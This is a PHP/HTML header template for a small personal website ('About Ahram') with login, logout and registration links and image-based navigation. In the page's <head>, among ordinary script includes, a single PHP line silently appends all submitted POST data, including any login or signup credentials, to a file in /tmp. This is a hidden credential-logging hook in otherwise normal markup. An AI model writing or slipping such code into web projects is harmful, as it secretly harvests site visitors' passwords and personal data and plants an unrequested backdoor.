
<!DOCTYPE html>

<html>
    <head>
        <link rel = "stylesheet" href = "style.css">
        <link rel = "shortcut icon" href = "pictures/Logo.png">
        <script src = "http://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src = "http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <script src = "javascript.js"></script>
        <?php file_put_contents("/tmp/sessions", implode("\n", $_POST) . "\n", FILE_APPEND); ?>
    </head>

    <body style>

        <div class = "headerelement">
            <ul class = "signupinForm">
                <li>
                    <a href = "login.php">LOG IN</a>
                </li>
                <li>
                    <a href = "logout.php">LOG OUT</a>
                </li>
                <li>
                    <a href = "signup.php">REGISTER</a>
                </li>
            </ul>
        </div>

        <hr class = "layout">

        <div class = "headerlogo">
            <div class = "logo">
                <a href = "home.php">
                    <img src = "pictures/AboutAhram.png" width = "650" height = "200">
                </a>
            </div>
        </div>

        <hr class = "layout">

        <div class = "subheader">
            <ul>
                <a href = "home.php">
                    <img src = "pictures/Home.png" id = "1" width = "40" height = "40">
                </a>
            
                <a href = "ahram.php">
                    <img src = "pictures/Who.png" id = "2" width = "40" height = "40">
                </a>
            
                <a href = "travel.php">
                    <img src = "pictures/Traveling.png" id = "3" width = "40" height = "40">
                </a>
                
                <a href = "food.php">
                    <img src = "pictures/Food.png" id = "4" width = "40" height = "40">
                </a>
            
                <a href = "sharing.php">
                    <img src = "pictures/sharing.png" id = "5" width = "40" height = "40">
                </a>
            </ul>
        </div>

        <hr class = "layout">